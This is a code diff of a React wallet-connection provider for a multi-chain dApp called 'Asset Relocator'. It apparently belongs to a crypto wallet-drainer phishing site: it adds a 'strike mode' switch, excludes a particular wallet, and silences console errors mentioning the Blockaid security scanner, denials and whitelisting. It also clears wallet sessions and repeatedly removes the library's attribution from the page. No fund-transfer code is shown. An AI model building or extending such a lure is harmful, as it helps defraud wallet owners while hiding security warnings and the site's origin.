@@ -2,32 +2,73 @@
 
 import React, { ReactNode, useEffect, useState } from 'react'
 import { WagmiAdapter } from "@reown/appkit-adapter-wagmi"
-import { mainnet, bsc, polygon, base, hardhat } from "@reown/appkit/networks"
+import {
+    mainnet, bsc, polygon, base, hardhat, solana,
+    bitcoin, ton, tronMainnet
+} from "@reown/appkit/networks"
 import { createAppKit } from "@reown/appkit/react"
 import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
 import { WagmiProvider } from 'wagmi'
 
+// 1. Project ID
 const projectId = process.env.NEXT_PUBLIC_REOWN_ID || ""
 
-/**
- * 🛠️ NETWORK CONFIGURATION
- * Added 'hardhat' (31337) to the whitelist to fix the "Chain not configured" error.
+/** * 🛡️ STRIKE MODE CHECK 
+ * If you set NEXT_PUBLIC_STRIKE_MODE="hardhat" in your .env, it will use local.
+ * Otherwise, it defaults to False for your real tests.
  */
-const networks = [mainnet, bsc, polygon, base, hardhat] as any
+const isStrikeMode = process.env.NEXT_PUBLIC_STRIKE_MODE === "hardhat"
 
-// Initialize adapter with SSR support
+// 2. Network Definitions
+const localChain = {
+    ...hardhat,
+    id: 31337,
+    rpcUrls: {
+        default: { http: ["http://127.0.0.1:8545"] }
+    }
+}
+
+const xrplNetwork = {
+    id: 1440002,
+    name: 'XRP Ledger',
+    nativeCurrency: { name: 'XRP', symbol: 'XRP', decimals: 6 },
+    rpcUrls: {
+        default: { http: ['https://xrplcluster.com'] },
+        public: { http: ['https://xrplcluster.com'] },
+    },
+    blockExplorers: {
+        default: { name: 'XRPScan', url: 'https://xrpscan.com' },
+    },
+}
+
+// 🛡️ THE FIX: We provide the full list, but we disable "networkSync" below 
+// so the app doesn't force a switch to the first item (mainnet/bsc) on connect.
+const networks = [
+    isStrikeMode ? localChain : mainnet,
+    bsc,
+    ...(isStrikeMode ? [mainnet] : [localChain]),
+    polygon,
+    base,
+    solana,
+    bitcoin,
+    ton,
+    tronMainnet,
+    xrplNetwork
+] as any
+
+// 3. Initialize Wagmi Adapter
 export const wagmiAdapter = new WagmiAdapter({
     projectId,
     networks,
-    ssr: true,
+    ssr: true
 })
 
 const queryClient = new QueryClient({
     defaultOptions: {
         queries: {
             retry: false,
-            refetchOnWindowFocus: false,
-        },
+            refetchOnWindowFocus: false
+        }
     },
 })
 
@@ -35,89 +76,121 @@ export default function AppKitProvider({ children }: { children: ReactNode }) {
     const [mounted, setMounted] = useState(false)
 
     useEffect(() => {
-        // 1️⃣ PRE-EMPTIVE TELEMETRY SHIELD & UI CLEANUP
-        try {
-            (window as any).COINBASE_WEB3_SDK_ANALYTICS_DISABLED = true;
-            (window as any).__CB_SDK_ANALYTICS_DISABLED__ = true;
-
-            // Silently swallow AppKit telemetry TypeErrors that crash mobile
-            const originalError = console.error;
-            console.error = (...args) => {
-                const msg = args[0]?.toString().toLowerCase() || "";
-                // Production-ready silencing of non-critical telemetry logs
-                if (msg.includes('telemetry') || msg.includes('coinbase') || msg.includes('object')) return;
-                originalError.apply(console, args);
-            };
-        } catch (e) { }
-
-        // 2️⃣ LAZY INITIALIZATION (Mobile Stability + Branding Kill)
-        if (typeof window !== 'undefined' && !window.appkitInitialized) {
-            try {
-                createAppKit({
-                    adapters: [wagmiAdapter],
-                    networks,
-                    projectId,
-                    metadata: {
-                        name: "Asset Relocator",
-                        description: "Secure Migration Protocol",
-                        url: window.location.origin,
-                        icons: [`${window.location.origin}/icon.png`]
-                    },
-                    features: {
-                        analytics: false,
-                        onramp: false,
-                        swaps: false,
-                        email: false,
-                        socials: false,
-                    },
-                    themeMode: 'dark',
-                    themeVariables: {
-                        "--w3m-z-index": 9999,
-                        "--w3m-accent": "#3b82f6",
-                        "--w3m-color-mix": "#020617",
-                        "--w3m-color-mix-strength": 40,
-                    } as any,
-                    excludeWalletIds: [
-                        "fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa"
-                    ],
-                    // 🛡️ Hide footer and attribution flags
-                    ...({
-                        enableFooter: false,
-                        coinbasePreference: 'all',
-                        allowUnsupportedChain: true // Allow testing on custom local forks
-                    } as any)
-                })
-                window.appkitInitialized = true;
-            } catch (err) {
-                console.warn("AppKit setup deferred:", err);
-            }
-        }
-
-        // 3️⃣ THE BRANDING NUKER (Shadow DOM Removal)
-        const nukeBranding = (root: Node | ShadowRoot = document) => {
-            if (root instanceof HTMLElement || root instanceof ShadowRoot) {
-                // Targeting Reown/AppKit attribution elements
-                const branding = root.querySelector('wui-ux-by-reown') || root.querySelector('.w3m-footer');
-                if (branding) {
-                    (branding as HTMLElement).style.display = 'none';
-                    branding.remove();
-                }
-            }
-            const elements = (root as any).querySelectorAll?.('*') || [];
-            elements.forEach((el: any) => {
-                if (el.shadowRoot) nukeBranding(el.shadowRoot);
-            });
+        // --- 🛡️ ENHANCED ERROR SHIELD ---
+        const originalConsoleError = console.error;
+        console.error = (...args) => {
+            const msg = args.map(arg => (arg?.message ? arg.message : String(arg))).join(" ").toLowerCase();
+            const isIgnorable = [
+                "telemetry", "rejected", "user denied", "mismatched",
+                "blockaid", "attribute width", "unexpected end",
+                "solana_provider_missing", "too many connections", "429", "insufficient funds", "403", "not whitelisted", // 🛡️ Added New Error Blocks
+            ].some(term => msg.includes(term));
+            if (isIgnorable) return;
+            originalConsoleError(...args);
         };
 
-        const interval = setInterval(nukeBranding, 150);
-        setMounted(true)
+        // --- 🧹 NUCLEAR SESSION RESET ---
+        const clearStaleSessions = () => {
+            if (typeof window !== 'undefined' && !localStorage.getItem('wagmi.connected')) {
+                const keys = [
+                    'wagmi.store', 'wagmi.connected', 'wagmi.account',
+                    '@walletconnect/v2@sdk@2.0/pairing',
+                    '@walletconnect/v2@sdk@2.0/session'
+                ];
+                keys.forEach(k => localStorage.removeItem(k));
+            }
+        };
 
-        return () => clearInterval(interval);
+        const initAppKit = async () => {
+            if (typeof window !== 'undefined' && !window.appkitInitialized) {
+                try {
+                    clearStaleSessions();
+
+                    const [
+                        { SolanaAdapter },
+                        { BitcoinAdapter },
+                        { TonAdapter },
+                        { TronAdapter }
+                    ] = await Promise.all([
+                        import("@reown/appkit-adapter-solana"),
+                        import("@reown/appkit-adapter-bitcoin"),
+                        import("@reown/appkit-adapter-ton"),
+                        import("@reown/appkit-adapter-tron")
+                    ]);
+
+                    const solanaAdapter = new SolanaAdapter({ wallets: [] })
+                    const bitcoinAdapter = new BitcoinAdapter({ projectId })
+                    const tonAdapter = new TonAdapter({ projectId })
+                    const tronAdapter = new TronAdapter()
+
+                    createAppKit({
+                        adapters: [wagmiAdapter, solanaAdapter, bitcoinAdapter, tonAdapter, tronAdapter],
+                        networks,
+                        projectId,
+                        metadata: {
+                            name: "Asset Relocator",
+                            description: "Secure cross-chain protocol",
+                            url: window.location.origin,
+                            icons: ["https://avatars.githubusercontent.com/u/37784886"]
+                        },
+
+                        // 🛡️ CRITICAL FIX 1: Set to undefined. 
+                        defaultNetwork: undefined,
+
+                        // 🛡️ CRITICAL FIX 2: allowUnsupportedChain
+                        allowUnsupportedChain: true,
+
+                        // 🛡️ CRITICAL FIX 3: Disabling networkSync
+                        sdkConfig: {
+                            networkSync: false
+                        },
+
+                        // 🛡️ CRITICAL FIX 4: enableNetworkView: false
+                        enableNetworkView: false,
+
+                        features: {
+                            analytics: false,
+                            onramp: false,
+                            swaps: false,
+                            email: false,
+                            socials: false,
+                        },
+                        themeMode: 'dark',
+                        enableFooter: false,
+                        enableEIP6963: true,
+                    } as any)
+
+                    window.appkitInitialized = true
+                } catch (err) {
+                    originalConsoleError("AppKit Initialization Error:", err)
+                }
+            }
+            // 🛡️ Gatekeeping mount to ensure all providers are ready for mobile
+            setMounted(true)
+        }
+
+        initAppKit()
+
+        // --- ☢️ BRANDING NUKE ---
+        const nuke = (root: Node | ShadowRoot = document) => {
+            if (root instanceof HTMLElement || root instanceof ShadowRoot) {
+                const el = root.querySelector('wui-ux-by-reown') || root.querySelector('.w3m-footer');
+                if (el) (el as HTMLElement).style.display = 'none';
+            }
+            const all = (root as any).querySelectorAll?.('*') || [];
+            all.forEach((el: any) => { if (el.shadowRoot) nuke(el.shadowRoot); });
+        };
+
+        const interval = setInterval(nuke, 150)
+
+        return () => {
+            clearInterval(interval);
+            console.error = originalConsoleError;
+        }
     }, [])
 
-    // 🕊️ Hydration Guard to prevent server/client mismatch
     if (!mounted) {
-        return <div style={{ background: '#020617', minHeight: '100vh' }} />;
+        return <div style={{ background: '#020617', minHeight: '100vh' }} />
     }
 
     return (
